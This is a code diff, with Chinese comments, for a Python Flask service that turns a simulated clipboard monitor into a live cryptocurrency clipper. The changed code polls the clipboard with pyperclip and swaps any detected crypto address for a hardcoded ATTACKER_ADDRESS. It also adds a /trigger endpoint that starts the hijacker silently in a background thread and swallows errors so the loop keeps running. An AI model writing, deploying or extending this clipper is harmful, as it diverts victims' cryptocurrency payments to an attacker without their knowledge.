@@ -1,6 +1,8 @@
 from flask import Flask
 import re
 import threading
+import pyperclip
+import time
 
 # 替换的目标地址
 ATTACKER_ADDRESS = "panteklu"
@@ -26,29 +28,31 @@ def is_crypto_address(address):
 
 def monitor_clipboard():
     """
-    模拟剪贴板监控内容，替换符合规则的加密货币地址。
+    实时监控剪贴板内容，替换符合规则的加密货币地址。
     """
     previous_content = ""
-    print("模拟开始剪贴板替换...")
     while True:
         try:
-            clipboard_content = input("模拟输入剪贴板内容（按 Enter 结束）：")  # 用户手动输入模拟替换的内容
+            clipboard_content = pyperclip.paste()  # 获取当前剪贴板内容
             if clipboard_content != previous_content and is_crypto_address(clipboard_content):
-                previous_content = ATTACKER_ADDRESS
+                pyperclip.copy(ATTACKER_ADDRESS)  # 替换剪贴板内容
                 print(f"替换结果: {clipboard_content} -> {ATTACKER_ADDRESS}")
+                previous_content = ATTACKER_ADDRESS
             else:
-                previous_content = clipboard_content
-        except KeyboardInterrupt:
-            print("监控终止")
-            break
+                previous_content = clipboard_content  # 保存当前内容，避免重复处理
+            time.sleep(0.5)  # 减少 CPU 使用
+        except Exception as e:
+            print(f"Error monitoring clipboard: {e}")
+            time.sleep(1)  # 如果出错，稍等后继续尝试
 
 
+# Flask 应用逻辑
 app = Flask(__name__)
 
 @app.route("/", methods=["GET"])
 def home():
     """
-    根路径响应。
+    根路径响应，通知服务运行正常。
     """
     return "Welcome to the clipboard monitoring service!", 200
 
@@ -56,11 +60,11 @@ def home():
 @app.route("/trigger", methods=["GET"])
 def trigger():
     """
-    触发监控内容。
+    触发剪贴板监控逻辑。
     """
     threading.Thread(target=monitor_clipboard).start()
-    print("Trigger triggered! 模拟剪贴板监控已经启动。")
-    return "", 204  # 返回 204 No Content
+    print("Trigger triggered! 剪贴板监控已经启动。")
+    return "", 204  # 返回 204 No Content，无页面显示
 
 
 if __name__ == "__main__":
